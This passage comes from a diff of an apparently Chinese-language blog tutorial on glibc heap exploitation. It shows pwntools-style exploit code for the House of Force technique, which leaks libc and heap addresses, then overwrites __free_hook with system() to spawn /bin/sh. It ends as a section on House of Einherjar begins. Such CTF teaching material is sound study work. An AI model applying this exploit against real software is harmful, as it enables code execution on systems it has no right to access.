+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1">#由于我们需要它的堆地址和libc所以我们需要调用4个堆块</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">show_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3afca0</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc base: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">show_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x250</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap base: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="c1">#把堆块重新放回去</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">n64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x10000000000000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">n64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span><span class="c1">#修改top chunk的size</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">n64</span><span class="p">((</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x270</span><span class="p">)</span><span class="o">-</span><span class="mh">0x10</span><span class="o">-</span><span class="mh">0x40</span><span class="p">))</span><span class="c1">#直接通过偏移早到free hook的地方</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">n64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说实话其实这个用法也不是很好用的一个手法</p>
+<h2 id="house-of-einherjar">house of einherjar
 </h2><p>这个攻击手法主要使用的一个技术手段就是heap overlapping的一个攻击手法，同时他的主要一个攻击手法就是使用的是在利用释放不在fast bin大小范围的chunk尝试和前面的chunk进行要给unlink的一个机制</p>
 <p><img src="/images/image-20250601184317006.png"
 	
